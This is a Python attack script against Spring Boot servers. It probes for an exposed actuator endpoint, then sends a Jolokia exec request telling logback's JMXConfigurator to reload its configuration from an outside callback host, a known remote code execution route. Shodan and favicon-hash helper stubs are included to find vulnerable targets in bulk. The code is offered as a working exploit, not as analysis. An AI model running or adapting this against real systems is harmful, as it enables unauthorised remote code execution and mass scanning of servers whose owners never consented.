import requests
import json
#https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
callback_domain = "example.requestcatcher.com"

rce_string = "http://example:9091/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/https:!/!/{}!/logback.xml".format(callback_domain)

print(rce_string)

def shodan_search(Target):
    cmd = "shodan search org:\""+Target+"\" http.favicon.hash:116323821 --fields ip_str,port --separator " " | awk '{print $1\":\"$2}'"

#https://github.com/KathanP19/JSFScan.sh
#https://github.com/deepsecurity-pe/GoGhost
def auto_search():
    #object here will pass in responding http hosts to pull favicon hashes
    cmd = 'cat urls.txt | python3 favfreak.py -o output'
    #https://medium.com/@Asm0d3us/weaponizing-favicon-ico-for-bugbounties-osint-and-what-not-ace3c214e139

    
def get_actuator_info(url):
    actuator_endpoint = url+':9091/actuator/'
    actuator_result = requests.get(actuator_endpoint,timeout=3,verify=False)
    if actuator_result:
       return actuator_result.json(),actuator_endpoint



def execute_rce_jolokia(rce_url):
    print(rce_url)
    rce_response =  requests.get(rce_url,timeout=3,verify=False)
    if rce_response:
        return True
    
    
print("*" *55)
print("Attempting to Determine Exploitability of Spring Boot Server")
print("*" *55)
results,endpoint = get_actuator_info('http://example.com')
if endpoint:
   print("Actuator Endpoing Exposed : True")
   print("*" *55)
   if results:
      try:
          is_vuln = execute_rce_jolokia(rce_string)
          if is_vuln:
             print("Vulnerable To Rce")
      except:
          pass
